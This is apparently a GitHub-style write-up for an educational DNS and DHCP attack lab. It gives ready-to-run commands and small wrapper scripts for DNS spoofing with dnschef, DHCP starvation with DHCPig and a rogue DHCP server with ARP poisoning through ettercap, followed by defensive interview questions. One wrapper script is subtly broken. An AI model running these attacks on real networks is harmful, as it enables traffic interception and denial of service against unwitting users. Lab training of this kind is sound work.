# DNS & DHCP Attack Vectors Lab

## 1. Project Overview

### 🔍 What are DNS & DHCP Attacks?
DNS (Domain Name System) and DHCP (Dynamic Host Configuration Protocol) are foundational to IP networking. When compromised, they can be leveraged for:
- Redirecting users to malicious websites (DNS Spoofing)
- Denial of service by exhausting DHCP leases (DHCP Starvation)
- Man-in-the-middle attacks through rogue DHCP or DNS servers

### 🎯 Why This Lab Is Important
This lab provides a controlled and isolated environment for cybersecurity learners and penetration testers to:
- Understand the mechanics of DNS and DHCP vulnerabilities
- Simulate real-world attack vectors
- Analyze network traffic and behavior
- Learn defense mechanisms

### ⚖️ Ethical & Legal Disclaimer
> This lab is intended for educational purposes only. All activities should be performed in isolated environments that you own or have explicit permission to test. Misuse of these techniques outside legal boundaries is illegal and unethical. The authors take no responsibility for any misuse.

---

## 2. Prerequisites

### 🖥️ Operating Systems
- Kali Linux (preferred)
- Ubuntu (with tools installed)

### 🛠 Tools
- `Ettercap`
- `DnsChef`
- `DHCPig`
- `Wireshark`
- `net-tools`, `tcpdump`

### 💻 Virtualization Platform
- VirtualBox or VMware

### ⚙️ System Requirements
- 4 GB RAM minimum (8 GB recommended)
- 2 CPU cores
- 20 GB disk space

### 🌐 Network Setup
- Host-only or NAT network
- Ensure isolated environment to avoid impacting other devices

---

## 3. Installation Guide

### 🔧 Lab Setup Steps

#### Step 1: Download & Install VirtualBox
```bash
sudo apt update && sudo apt install virtualbox
```

#### Step 2: Install Kali Linux ISO in VirtualBox
- Allocate 2 CPUs, 4 GB RAM, 20 GB HDD
- Use Host-only Adapter for safe isolation

#### Step 3: Install Tools
```bash
sudo apt install ettercap-graphical dnschef wireshark net-tools python3-pip
sudo pip3 install dhcpig
```

#### Step 4: Network Configuration
- Ensure Host-only network is active
- Assign static IP if needed: 
```bash
sudo ifconfig eth0 192.168.56.101 netmask 255.255.255.0 up
```

---

## 4. Folder Structure & Files

```
DNS_DHCP_Attack_Lab/
├── README.md
├── LICENSE
├── scripts/
│   ├── dns_spoof.py
│   ├── rogue_dhcp.sh
│   └── dhcp_starvation.py
├── screenshots/
│   └── sample_output.png
├── lab_exercises/
│   ├── dns_spoofing.md
│   ├── dhcp_starvation.md
│   ├── rogue_dhcp.md
│   └── sniffing_with_wireshark.md
└── interview_questions.md
```

### 📁 Explanation
- `scripts/`: Custom automation scripts (Bash/Python)
- `screenshots/`: Example outputs and UIs
- `lab_exercises/`: Markdown guides for each attack
- `README.md`: Main documentation
- `interview_questions.md`: Optional technical Q&A

---

## 5. Lab Exercises & Attack Scenarios

### ⚠️ 1. DNS Spoofing using DnsChef
```bash
sudo dnschef --fakeip 192.168.56.105 --interface eth0
```
Expected: Any DNS request gets spoofed IP

### 💣 2. DHCP Starvation using DHCPig
```bash
sudo python3 $(which dhcpig) -i eth0
```
Expected: Legitimate users are denied IPs

### 🎭 3. Rogue DHCP Server with Ettercap
```bash
sudo ettercap -T -q -i eth0 -P dhcp -M arp:remote
```
Expected: Victim receives IP and gateway from attacker

### 🔍 4. Sniffing Traffic with Wireshark
- Start Wireshark and filter:
```
dns or bootp
```
Expected: Monitor DNS and DHCP traffic in real-time

---

## 6. README.md (Sample)

```markdown
# 🧪 DNS & DHCP Attack Vectors Lab

Welcome to the DNS & DHCP Attack Vectors Lab. This project is designed for learners, researchers, and penetration testers who want to explore and understand the practical side of network attacks.

## 🔍 Overview
Simulate DNS spoofing, DHCP starvation, and rogue DHCP attacks in a safe, controlled virtual environment.

## 📦 Contents
- DNS Spoofing using DnsChef
- DHCP Starvation using DHCPig
- Rogue DHCP via Ettercap
- Traffic Analysis via Wireshark

## ⚙️ Tools
- Kali Linux
- DnsChef
- DHCPig
- Ettercap
- Wireshark

## 📁 Directory Structure
(See folder structure above)

## 🚀 Usage
```bash
cd scripts
sudo python3 dns_spoof.py
sudo ./rogue_dhcp.sh
```

## ⚠️ Legal Notice
This project is for **educational** use only. Do **NOT** deploy these techniques on unauthorized systems.

## 📄 License
MIT License - see `LICENSE` file for details
```

---

## 7. Troubleshooting & Tips

### 🧯 Common Errors & Fixes
- **Interface not found**: Check `ifconfig` and correct interface
- **Wireshark permission denied**: Add user to `wireshark` group
```bash
sudo usermod -aG wireshark $USER
```
- **IP conflict**: Ensure no two DHCP servers run simultaneously
- **VirtualBox NAT issues**: Use Host-only Adapter for full control

---

## 8. Interview Questions (DNS/DHCP)

1. **What is the role of DHCP in networking?**
   > Automatically assigns IPs, gateways, DNS info to clients

2. **How does DNS Spoofing work?**
   > Attacker sends falsified DNS responses to redirect users

3. **What is DHCP Starvation?**
   > Exhausts DHCP pool by flooding it with fake requests

4. **How to detect rogue DHCP servers?**
   > Use tools like `dhcpdump`, monitor leases, validate MACs

5. **How to prevent DNS spoofing?**
   > Use DNSSEC, validate certificates, isolate internal DNS

6. **Difference between static and dynamic IPs?**
   > Static is manual and persistent, dynamic is leased temporarily

7. **What is ARP poisoning? How does it relate to DHCP attacks?**
   > Sends fake ARP messages; can be used post-DHCP attack to redirect traffic

8. **How to mitigate DHCP starvation?**
   > Use port security, DHCP snooping, MAC filtering

9. **Can DNS spoofing work over HTTPS?**
   > Only partially; users will get cert errors

10. **Why use Host-only adapter in labs?**
    > Prevents interaction with external networks for safety

---

## ✅ Final Notes
This project was created to provide real-world exposure to core network attack techniques and foster defensive thinking. Fork it, contribute, or use it in your next pentest lab.

---

> Maintained by: [Your GitHub Handle Here]  
> License: MIT  
> Pull Requests Welcome!

---

## 📜 Scripts

### `scripts/dns_spoof.py`
```python
#!/usr/bin/env python3
import subprocess
print("[+] Starting DNS Spoofing with DnsChef...")
subprocess.run(["sudo", "dnschef", "--fakeip", "192.168.56.105", "--interface", "eth0"])
```

### `scripts/rogue_dhcp.sh`
```bash
#!/bin/bash
# Rogue DHCP with Ettercap

echo "[+] Launching Rogue DHCP Server via Ettercap..."
sudo ettercap -T -q -i eth0 -P dhcp -M arp:remote
```

### `scripts/dhcp_starvation.py`
```python
#!/usr/bin/env python3
import subprocess
print("[+] Launching DHCP Starvation using DHCPig...")
subprocess.run(["sudo", "python3", "$(which dhcpig)", "-i", "eth0"], shell=True)
```

---

## 📚 Lab Exercise Markdown Files (Summaries)

### `lab_exercises/dns_spoofing.md`
- Objective: Redirect victim’s DNS queries
- Tool: DnsChef
- Steps: Setup → Run → Validate
- Output: All domain requests go to attacker IP

### `lab_exercises/dhcp_starvation.md`
- Objective: Deny network access
- Tool: DHCPig
- Steps: Run Python tool → Observe DHCP exhaustion
- Output: No more leases available

### `lab_exercises/rogue_dhcp.md`
- Objective: Assign malicious gateway/IP
- Tool: Ettercap
- Steps: Start Ettercap → ARP poisoning
- Output: Victim uses attacker's DHCP config

### `lab_exercises/sniffing_with_wireshark.md`
- Objective: Capture and inspect traffic
- Tool: Wireshark
- Steps: Start capture → Apply filters (`dns`, `bootp`)
- Output: View DNS/DHCP handshakes, responses
